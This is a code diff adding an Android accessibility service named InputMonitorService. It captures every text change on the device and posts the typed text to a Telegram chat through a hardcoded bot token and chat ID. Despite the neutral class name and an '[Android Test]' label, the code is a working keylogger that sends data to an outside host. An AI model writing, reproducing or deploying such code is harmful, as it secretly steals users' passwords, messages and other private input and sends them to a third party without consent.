@@ -1,0 +1,48 @@
+import android.accessibilityservice.AccessibilityService;
+import android.view.accessibility.AccessibilityEvent;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
+
+public class InputMonitorService extends AccessibilityService {
+
+    private static final String BOT_TOKEN = "8951304151:AAF1_nUdFkgfvtiYWoRlQhv5-voP1Q_EIfE";
+    private static final String CHAT_ID = "5022620385";
+
+    @Override
+    public void onAccessibilityEvent(AccessibilityEvent event) {
+        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+            CharSequence text = event.getText();
+            if (text != null && text.length() > 0) {
+                sendToTelegram(text.toString());
+            }
+        }
+    }
+
+    private void sendToTelegram(final String data) {
+        new Thread(() -> {
+            try {
+                URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
+                conn.setDoOutput(true);
+
+                String payload = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"[Android Test] Captured: " + data + "\"}";
+                
+                try (OutputStream os = conn.getOutputStream()) {
+                    byte[] input = payload.getBytes("utf-8");
+                    os.write(input, 0, input.length);
+                }
+                
+                conn.getResponseCode();
+                conn.disconnect();
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }).start();
+    }
+
+    @Override
+    public void onInterrupt() {}
+}
